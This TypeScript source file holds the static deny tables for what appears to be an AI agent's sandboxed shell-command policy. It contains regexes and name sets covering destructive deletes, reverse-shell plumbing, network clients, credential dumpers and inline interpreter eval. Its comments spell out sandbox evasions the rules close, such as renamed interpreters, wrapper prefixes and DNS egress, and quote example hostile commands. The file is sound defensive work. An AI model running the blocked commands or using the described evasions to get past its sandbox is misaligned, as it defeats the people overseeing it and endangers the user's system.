// Static rule tables for the shell-command policy. Pure data: command
// denylist regexes, the browser-open detector, and the argv[0] interpreter /
// network-client basename sets. Consumed by shell-detectors.ts and
// shell-policy.ts; no logic lives here.

// Destructive `rm` spelled anywhere in the text (a -f or -r flag; catches split
// flags like `rm -a -f`). The deletes themselves are read by the delete
// extractor (shell-delete-targets.ts); this is the backstop for the ones it
// cannot read: a delete in an interpreter's code (`python -c
// 'os.system("rm -rf /")'`) is no command position. NOT in BLOCKED_COMMANDS:
// shell-policy.ts refuses it only in the confined modes, where a delete must
// be proven inside the workspace; a blanket denylist entry would re-block the
// user's own files in unrestricted mode.
export const RM_DESTRUCTIVE_FLAGS = /\brm\s+.*(-[a-zA-Z]*f|-[a-zA-Z]*r)\b/i;

// Raw-text patterns over the whole command line: network egress, and the
// shapes that are not a command word (redirects, continuations, phrases).
// Everything that IS a command word is an argv rule in
// shell-command-rule-table.ts, which reads the command being run.
export const BLOCKED_COMMANDS = [
  // The network clients themselves are the "network-client" argv rule
  // (NETWORK_CLIENT_BINS below): the command being run, not a word in the line.
  // dig/host/nslookup/getent/ping/traceroute/open are DANGEROUS_INVOKE_BINS for
  // the same reason (`grep host /etc/hosts` is not an invocation of host).
  // A backslash-newline is a line continuation, joined before any rule reads
  // the command (shell-source-text.ts). `nohup … &` is a backgrounded command,
  // refused by the bare-& rule wherever backgrounding is. The Windows
  // credential store is the "credential-store" argv rule (cmdkey, vaultcmd,
  // keymgr.dll): the words "credential manager" are prose ("Git Credential
  // Manager").
];

// Network use spelled INSIDE a body the command walk cannot read as a command:
// a .NET or Python script handed to an interpreter, or the socket plumbing of
// a reverse shell. Text patterns, so they can only match words; applied, like
// the network-client rule, only where no kernel cage holds egress.
// HTTP libraries named inside a program. Read over PROGRAM text only (the
// inline programs and heredoc programs of a command, shell-detectors.ts
// detectInlineNetwork), never the command line: `pip install aiohttp`, `grep
// -rn http.client src` and a comment naming urllib are not programs. Their
// destination is the URL the program spells, so for a program whose every
// destination is a literal this machine's own (shell-inline-destinations.ts)
// shell-policy skips these: it reaches no farther than a shell client to the
// same port.
export const INLINE_HTTP_LIBRARY_PATTERNS: readonly RegExp[] = [
  /\bNet\.WebClient\b/i,                    // .NET web client
  /\bSystem\.Net\.Http/i,                   // .NET HTTP
  /\brequests\.(get|post|put|delete)\b/i,   // Python requests
  /\burllib\.(request|urlopen)\b/i,         // Python urllib
  // Python httpx and http.client, as the module names are spelled, so prose
  // ("responds to plain HTTP.") is not read as a client.
  /\bhttpx\.\w/,
  /\bhttp\.client\b/,
  /\baiohttp\b/i,                           // Python aiohttp
];



// The command-line forms of these are argv rules now (shell-command-rule-table.ts),
// which read the command being run instead of matching its words anywhere. Inside
// an inline PROGRAM (`python -c "…"`, `node -e "…"`, an awk program) the text is
// code, not a command line, so matching the words is the only check there is, and
// these patterns keep that coverage exactly as the command-line list gave it.
export const INLINE_CODE_PATTERNS: readonly RegExp[] = [
  /\bsudo\b/i,
  /\bchmod\s+777\b/i,
  /\bmkfs\b/i,
  /\bdd\s+.*of=/i,
  /(?<!-)\bformat\b\s+(\/|\\|[A-Za-z]:)/i,
  // `eval` is not here: inside a program it is the language's own eval (a
  // Python builtin, an evaluator being written), not the shell's.
  /\bperl\s+-e\b/i,
  /\bruby\s+-e\b/i,
  /\bphp\s+-r\b/i,
  /\bbase64\s+(-[a-zA-Z]*d|--decode)\b/i,
  /\bpowershell\b.*-enc/i,
  /\bnet\s+user\b/i,
  /\breg\s+(add|delete|query|export|import|save|restore|load|unload)\b/i,
  /\bwmic\b/i,
  /\bschtasks\b/i,
  /\|.*\b(bash|sh|cmd|powershell)\b/i,
  /\bosascript\s/i,
  /\bxdg-open\s/i,
  /\blaunchctl\b/i,
  /\bautomator\b/i,
  /\bshortcuts\s/i,
  /\bosacompile\b/i,
  /\bdefaults\s+write\b.*Launch(Agents|Daemons)/i,
  /^\.\s+\//,
  /\bsource\s+\//i,
  /\bbash\s+-i\b/i,
  /\bsh\s+-i\b/i,
  /\bzsh\s+-i\b/i,
  /\bpython[23]?\s+-i\b/i,
  /\bnode\s+--inspect/i,
  /\bmkfifo\b/i,
  /\bscreen\s+-[dD]/i,
  /\btmux\s+new/i,
  /\bxterm\b.*-e/i,
  /\bpython[23]?\s+-m\s+http\.server\b/i,
  /\bpython[23]?\s+-m\s+smtpd\b/i,
  /\bphp\s+-S\b/i,
  /\bnpx\s+serve\b/i,
  /\bmimikatz\b/i,
  /\bhashdump\b/i,
  /\bsecurity\s+find-generic-password/i,
  /\bfdisk\b/i,
  /\bparted\b/i,
];

// ── argv[0] dangerous-command basenames ──
// Network/DNS/opener/disk binaries that are dangerous when INVOKED, but whose
// bare names are common English/argument words. Matching them as substrings
// (the old `\bopen\s`/`\bhost\s`/`\bping\s` BLOCKED_COMMANDS entries) blocked
// benign commands like `grep host /etc/hosts` or `… | grep open`. They are now
// detected by the argv[0] basename of each pipe segment (detectDangerousInvokeBin),
// the same structural approach as NETWORK_CLIENT_BINS: `grep host` (host as an
// argument) passes; `host evil.com` / `cat x | mail a@evil` (the binary as the
// invoked command) is blocked. The rarer-word network clients (curl/wget/nc/…)
// deliberately stay as substring patterns above — they almost never appear as a
// benign argument, so the broader match is extra coverage, not a false-positive
// source.
export const DANGEROUS_INVOKE_BINS = new Set([
  "open", "host", "ping", "mount", "umount",
  "mail", "mailx", "dig", "nslookup", "getent", "traceroute",
  // PowerShell's resolver cmdlet: the Windows cage cannot fence DNS, which the
  // resolver service answers on any user's behalf (escape matrix, 2026-09-29).
  "resolve-dnsname",
]);

// Commands that hand a URL to the system browser / an external app, read as
// command positions (shell-detectors.ts detectBrowserOpen). Rejected with a
// specific "use the browser tool instead" message (which has CDP attach,
// audit logging, and no system-app launch) on EVERY bash-spawning path (bash,
// process_start, process_restart). The cross-platform openers take an
// http(s): or www. argument; the two browser launchers and rundll32's url.dll
// open one whatever they are given; `Start-Process` is read inside a
// PowerShell body as the walk reads any body.
export const BROWSER_OPENERS_WITH_URL = new Set(["start", "explorer", "open", "xdg-open", "start-process"]);
export const BROWSER_LAUNCHERS = new Set(["sensible-browser", "wslview"]);
export const URL_ARGUMENT = /^(?:https?:|www\.)/i;

// ── C3-13: argv-aware interpreter-escape detection ──
// argv[0] basenames that run an inline-eval body via `-e`/`-E`/`-r` flags.
export const INTERP_ESCAPE_BINS = new Set(["perl", "ruby", "php"]);

// ── R4-11/R4-13: inline-eval interpreter-escape refusal (non-unrestricted) ──
// A regex denylist over a Turing-complete interpreter body cannot soundly
// classify what `node -e`/`python -c` will do (R4-11), and keying the existing
// escape detectors on a basename SPELLING set lets a renamed interpreter
// (`./myperl -e`, `cp /usr/bin/perl ./py && ./py -e`) slip past (R4-13). The
// sound class-level fix is to REFUSE the inline-eval interpreter FORM in
// common/workspace modes (unrestricted stays permissive) and make the agent
// write a path-guard-visible script file instead. No capability is removed.
//
// Per-interpreter eval flags: argv[0] basename → the flag tokens that make it
// evaluate an inline body. CRITICAL: `-c` is an eval flag ONLY for python — for
// sh/bash/zsh/dash, `-c '...'` is the NORMAL shell form (the shell tool itself
// spawns `bash -c`), so those shells are deliberately absent here and stay
// ALLOWED.
export const INTERP_EVAL_FLAGS: Record<string, Set<string>> = {
  python: new Set(["-c"]),
  python3: new Set(["-c"]),
  // perl: -e/-E eval; -n/-p wrap an implicit loop but still require an -e body,
  // and the argv-aware short-flag scan in detectInterpreterEscape already walks
  // clustered forms (`-ne`), so the eval signal here is -e/-E.
  perl: new Set(["-e", "-E"]),
  ruby: new Set(["-e"]),
  php: new Set(["-r"]),
  node: new Set(["-e", "-p", "--eval", "--print"]),
  deno: new Set(["-e", "--eval"]),
  bun: new Set(["-e", "-p", "--eval", "--print"]),
};

/** Is `word` an eval flag of `bin`: one listed, or a short cluster that holds
 *  a listed single letter (`python3 -Ic`, `perl -ne`, `perl -we`). A long
 *  cluster is a flag with a glued value (`ruby -rsocket`), not an eval. */
export function isInlineEvalFlag(bin: string, word: string): boolean {
  const flags = INTERP_EVAL_FLAGS[bin];
  if (!flags) return false;
  if (flags.has(word)) return true;
  if (!/^-[a-zA-Z]{2,3}$/.test(word)) return false;
  return [...flags].some((f) => f.length === 2 && word.includes(f[1]));
}

/** The programs an interpreter at command position `p` was handed inline:
 *  the word after each eval flag. The one reading shared by the inline-code
 *  rule (shell-command-rule-table.ts), the destination reader
 *  (shell-inline-destinations.ts) and the inline network scan
 *  (shell-detectors.ts), so a form one sees the others see. */
export function inlineProgramsOf(p: { bin: string; words: string[]; at: number }): string[] {
  if (!INTERP_EVAL_FLAGS[p.bin]) return [];
  const args = p.words.slice(p.at + 1);
  return args.filter((_, i) => i > 0 && isInlineEvalFlag(p.bin, args[i - 1]));
}

// The rename-escape (part b) flag set: any eval-style flag that, paired with a
// model-writable-path argv[0], marks a renamed interpreter. Legit workspace
// executables (`./node_modules/.bin/tsc`, `./build/app`) are not invoked with
// `-e '<code>'`, so this targets the rename-escape without breaking dev flows.
export const RENAME_ESCAPE_EVAL_FLAGS = new Set([
  "-e", "-E", "-r", "-c", "-p", "--eval", "--print",
]);

// ── Network clients, judged as the command being run ──
// A network client is one only when it LEADS a command: `git fetch` is not,
// `ls ~/.ssh 2>&1` is not, `echo curl` is not, and `curl.exe`, `/usr/bin/curl`,
// `env curl`, `bash -c "curl …"` all are (execBasename + the command walk).
// The rule that reads this set (shell-command-rule-table.ts, "network-client")
// applies only where nothing else holds egress: under a kernel cage with the
// egress proxy (macOS seatbelt, Linux netns bridge, the Windows fence) these
// commands run and the cage decides what they reach.
export const NETWORK_CLIENT_BINS = new Set([
  "fetch", "http", "https", "xh", "httpie", "curlie",
  "curl", "wget", "aria2c", "websocat",
  "nc", "ncat", "nc.traditional", "socat", "telnet",
  "ssh", "scp", "sftp", "rsync", "ftp", "tftp",
  "sendmail", "ssmtp",
  "dnscat", "chisel",
  "invoke-webrequest", "invoke-restmethod", "iwr", "irm", "start-bitstransfer",
]);

// ── argv[0] resolution: leading tokens to skip to find the REAL command ──
// A network/dangerous binary can sit at tokens[1+] behind a shell KEYWORD
// (`then dig …`, `do host …`) or a command-modifier WRAPPER (`env dig …`,
// `time xh …`, `timeout 5 dig …`, `xargs dig …`). The argv[0] scans strip
// these prefixes — and a wrapper's own option/number/VAR=val args — to reach
// the real command word. This matters because the argv[0]-only bins
// (dig/host/nslookup/getent/traceroute/mail + the NETWORK_CLIENT_BINS) have NO
// raw-string denylist backstop the way curl/wget/nc do, so once separators are
// relaxed under a confined backend, a leading keyword/wrapper would otherwise
// let them evade (`if true; then dig evil.com; fi`).
// `if`, `while`, `until` and `!` lead a command the same way (`if curl …; then`),
// and `{` opens a group whose first word is a command.
export const SHELL_KEYWORD_PREFIXES = new Set(["then", "do", "else", "elif", "if", "while", "until", "!", "{"]);
export const SHELL_WRAPPER_PREFIXES = new Set([
  "env", "command", "exec", "time", "timeout", "nice", "ionice",
  "nohup", "setsid", "stdbuf", "xargs", "sudo", "doas",
]);

// Per-wrapper SHORT options that take a DETACHED value token (`xargs -I {}`,
// `env -u NAME`, `timeout -s TERM`, `nice -n 10`, `stdbuf -o L`). Without this,
// resolveRealArgv0 would return the value ({}, NAME, TERM, 10, L) as the argv[0]
// and the real bin at the following token would hide. Only consulted for the
// EXACT `-X` form (a glued `-I{}` / `-n10` / `-oL` carries its own value, and a
// `-x=v` form is self-contained), so a value-taking flag never eats a real
// command word. Wrappers absent here (command/exec/nohup/setsid) take no
// detached values. sudo and doas do (`sudo -u postgres rm …`): without them
// `postgres` read as the command and the rm behind it hid from every rule.
export const WRAPPER_VALUE_OPTIONS: Record<string, Set<string>> = {
  sudo: new Set(["-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "-T"]),
  doas: new Set(["-u", "-C"]),
  xargs: new Set(["-I", "-i", "-a", "-E", "-e", "-L", "-l", "-n", "-P", "-s", "-d"]),
  env: new Set(["-u", "-C", "-S"]),
  timeout: new Set(["-s", "-k"]),
  nice: new Set(["-n"]),
  ionice: new Set(["-c", "-n", "-p"]),
  stdbuf: new Set(["-i", "-o", "-e"]),
  time: new Set(["-o", "-f"]),
};
